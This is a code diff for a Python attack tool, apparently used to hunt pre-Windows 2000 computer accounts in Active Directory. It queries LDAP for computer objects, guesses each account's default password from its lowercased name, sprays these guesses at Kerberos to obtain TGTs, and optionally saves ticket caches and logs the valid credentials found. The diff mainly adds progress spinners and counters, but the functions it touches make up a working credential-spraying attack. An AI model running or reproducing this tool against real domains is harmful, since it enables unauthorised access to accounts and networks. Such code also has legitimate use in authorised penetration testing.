@@ -12,7 +12,8 @@ from impacket.krb5.kerberosv5 import getKerberosTGT
 from impacket.krb5 import constants
 from impacket.krb5.types import Principal
 import os
-
+from rich.console import Console
+from datetime import datetime
 
 show_banner = '''
 
@@ -29,7 +30,7 @@ show_banner = '''
 
 
 '''
-
+console = Console()
 
 def arg_parse():
     parser = argparse.ArgumentParser(add_help=True, description=
@@ -51,6 +52,7 @@ def arg_parse():
     unauth_parser.add_argument("-stoponsuccess", action='store_true', help="Stop on sucessful authentication")
     unauth_parser.add_argument("-save", action="store_true", help="Request and save a .ccache file to your current working directory")
 
+
     auth_parser = subparsers.add_parser("auth", help="Query the domain for pre Windows 2000 machine accounts.")
     auth_parser.add_argument("-u", action='store', metavar='', help="Username")
     auth_parser.add_argument('-p', action='store', metavar='', help="Password")
@@ -66,6 +68,7 @@ def arg_parse():
     auth_parser.add_argument("-outputfile", action="store", help="Log results to file.")
     auth_parser.add_argument("-stoponsuccess", action='store_true', help="Stop on sucessful authentication")
     auth_parser.add_argument("-save", action="store_true", help="Request and save a .ccache file to your current working directory")
+   
 
     if len(sys.argv) == 1:
         parser.print_help()
@@ -338,30 +341,34 @@ class machinehunter:
 
     def fetch_computers(self, ldap_session):
         creds = []
-        if self.targeted:
-            search_filter = "(&(objectclass=computer)(useraccountcontrol=4128))"
-        else:
-            search_filter = "(objectclass=computer)"
-        try:
-            ldap_session.extend.standard.paged_search(self.search_base, search_filter, attributes=self.attributes, paged_size=500, generator=False)
+        num = 0
+        with console.status(f"Searching...", spinner="dots") as status:
+            if self.targeted:
+                search_filter = "(&(objectclass=computer)(useraccountcontrol=4128))"
+            else:
+                search_filter = "(objectclass=computer)"
+            try:
+                ldap_session.extend.standard.paged_search(self.search_base, search_filter, attributes=self.attributes, paged_size=500, generator=False)
+                # print (f'Retrieved {len(self.ldap_session.entries)} results total.')
+            except ldap3.core.exceptions.LDAPAttributeError as e:
+                print()
+                print (f'Error: {str(e)}')
+                exit()
+            for entry in ldap_session.entries:
+                num += 1
+                status.update(f"Retrieved {num} results.")
+                json_entry = json.loads(entry.entry_to_json())
+                attributes = json_entry['attributes'].keys()
+                for attr in attributes:
+                    val = entry[attr].value
+                    if len(val) >= 15:
+                        #if account name is 15 chars or more pw is first 14
+                        credentials = val + ":" + val.lower()[:-2]
+                    else:
+                        credentials = val + ":" + val.lower()[:-1]
+                    creds.append(credentials)
             print (f'Retrieved {len(self.ldap_session.entries)} results total.')
-            print (f'Testing authentication...')
-        except ldap3.core.exceptions.LDAPAttributeError as e:
-            print()
-            print (f'Error: {str(e)}')
-            exit()
-        for entry in ldap_session.entries:
-            json_entry = json.loads(entry.entry_to_json())
-            attributes = json_entry['attributes'].keys()
-            for attr in attributes:
-                val = entry[attr].value
-                if len(val) >= 15:
-                    #if account name is 15 chars or more pw is first 14
-                    credentials = val + ":" + val.lower()[:-2]
-                else:
-                    credentials = val + ":" + val.lower()[:-1]
-                creds.append(credentials)
-        return creds
+            return creds
 
 
 def printlog(line, outputfile):
@@ -371,31 +378,40 @@ def printlog(line, outputfile):
         f.close
 
 def pw_spray(creds, args):
-    for cred in creds:
-        try:
-            username, password = cred.split(":")
-            save = False
-            executer = GETTGT(username, password, args.d, args.dc_ip)
-            if args.save:
-                save=True
-            validate = executer.run(save)
-            if validate:
-                line = (f'[+] VALID CREDENTIALS: {args.d}\\{cred}')
-                print (line)
-                if args.outputfile:
-                        printlog(line, args.outputfile)
-                if args.stoponsuccess:
-                    break
-        except KeyboardInterrupt:
-            print("Stopping session...")
-            sys.exit()
-        except:
-            if args.verbose:
-                line = (f'[-] Invalid credentials: {args.d}\\{cred}')
-                print (line)
-                if args.outputfile:
-                        printlog(line, args.outputfile)
-
+    dt = datetime.now()
+    print("Testing started at", dt)
+    with console.status(f"", spinner="dots") as status:
+        tried = 0
+        valid = 0
+        accounts = len(creds)
+        for cred in creds:
+            try:
+                tried += 1
+                status.update(f"Tried {tried}/{accounts}. {valid} valid.")
+                username, password = cred.split(":")
+                save = False
+                executer = GETTGT(username, password, args.d, args.dc_ip)
+                if args.save:
+                    save=True
+                validate = executer.run(save)
+                if validate:
+                    valid += 1
+                    line = (f'[+] VALID CREDENTIALS: {args.d}\\{cred}')
+                    print (line)
+                    if args.outputfile:
+                            printlog(line, args.outputfile)
+                    if args.stoponsuccess:
+                        print("Valid credential found! Stopping session...")
+                        break
+            except KeyboardInterrupt:
+                print("Stopping session...")
+                sys.exit()
+            except:
+                if args.verbose:
+                    line = (f'[-] Invalid credentials: {args.d}\\{cred}')
+                    print (line)
+                    if args.outputfile:
+                            printlog(line, args.outputfile)
 
 def parse_input(inputfile, args):
     creds = []
@@ -411,6 +427,7 @@ def parse_input(inputfile, args):
         pw_spray(creds, args)
 
 def main():
+    dt = datetime.now()
     print(show_banner)
     args = arg_parse()
     if args.command == "unauth":
@@ -424,6 +441,7 @@ def main():
             args.lmhash, args.nthash = args.hashes.split(':')
         if not (args.p or args.lmhash or args.nthash or args.aes or args.no_pass):
                 args.p = getpass("Password:")
+        creds = 0
 
         try:
             ldap_server, ldap_session = init_ldap_session(domain=args.d, username=args.u, password=args.p, lmhash=args.lmhash, nthash=args.nthash, kerberos=args.kerberos, domain_controller=args.dc_ip, aesKey=args.aes, hashes=args.hashes, ldaps=args.ldaps
